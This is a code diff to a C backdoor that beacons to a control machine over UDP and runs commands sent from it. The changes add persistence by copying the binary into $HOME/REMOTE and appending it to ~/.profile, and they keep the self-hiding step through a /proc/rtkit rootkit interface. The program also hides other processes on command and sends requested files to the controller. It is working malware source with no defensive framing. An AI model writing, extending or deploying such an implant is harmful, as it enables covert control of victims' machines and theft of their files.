@@ -13,8 +13,8 @@
 #define LENGTH  1518
 struct sockaddr_in control_add;
 struct sockaddr_in remote_add;
-static int run = 1;
 int sockfd;
+int run = 1;  // Control Send on-line message
 int length = sizeof(struct sockaddr_in);
 char datagram[LENGTH];
 
@@ -57,14 +57,19 @@ void sendOnline() {
 
 void initRemote() {
     int pid = getpid();
-    char command[64];
+    char command[512];
+    FILE *fp;
 
     // Hidden process
     bzero(command, sizeof(command));
     sprintf(command, "echo -n hp%d > /proc/rtkit", pid);
-    popen(command, "r");
-    // popen("chmod 755 *", "r");
-    // popen("sh ./init.sh", "r");
+    fp = popen(command, "r");
+    pclose(fp);
+    strcpy(command, "[ -d $HOME/REMOTE ] || mkdir $HOME/REMOTE\n\
+                     [ -d $HOME/REMOTE/remote ] || cp ./remote $HOME/REMOTE\n\
+                     grep -q \"$HOME/REMOTE/remote\" $HOME/.profile || echo \"\n$HOME/REMOTE/remote\" >> $HOME/.profile");
+    fp = popen(command, "r");
+    pclose(fp);
 }
 
 int main(int argc, char const *argv[]) {
@@ -86,7 +91,7 @@ int main(int argc, char const *argv[]) {
     control_add.sin_addr.s_addr = inet_addr(control_ip);
 
     while(1) {
-        // Send on-line information to the control machine
+        // Send on-line message to the control machine
         while(run) {
             if (run == 1) {
                 puts("Waiting for connection...");
@@ -114,7 +119,6 @@ int main(int argc, char const *argv[]) {
         sscanf(datagram, "%[^ ]", command);
         // Use function chdir() to replacement command 'cd'
         if (strcmp(command, "cd") == 0) {
-            bzero(command, sizeof(command));
             sscanf(datagram, "%*3s%s", path);
             if (chdir(path) == -1) {
                 printf("Chdir: %s\n", strerror(errno));
@@ -124,12 +128,11 @@ int main(int argc, char const *argv[]) {
         }
         // Continue to send on-line message
         else if (strcmp(command, "quit\n") == 0) {
-            bzero(command, sizeof(command));
             run = 1;
+            continue;
         }
         // Quit the remote
         else if (strcmp(command, "squit\n") == 0) {
-            bzero(command, sizeof(command));
             break;
         }
         // Hide process with given id
@@ -137,13 +140,11 @@ int main(int argc, char const *argv[]) {
             bzero(command, sizeof(command));
             sscanf(datagram, "%*5s%s", hidepid);
             sprintf(command, "echo -n hp%s > /proc/rtkit", hidepid);
-            printf("%s\n", command);
             bzero(hidepid, sizeof(hidepid));
             fp = popen(command, "r");
         }
         // Transfer file to the control machine
         else if (strcmp(command, "tran") == 0) {
-            bzero(command, sizeof(command));
             sscanf(datagram, "%*5s%s", filename);
             fp = fopen(filename, "r");
             fseek(fp, 0, SEEK_END);
@@ -192,6 +193,7 @@ int main(int argc, char const *argv[]) {
         x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
         if (x == -1)
             printError(2, strerror(errno));
+        pclose(fp);
     }
     close(sockfd);
     return 0;
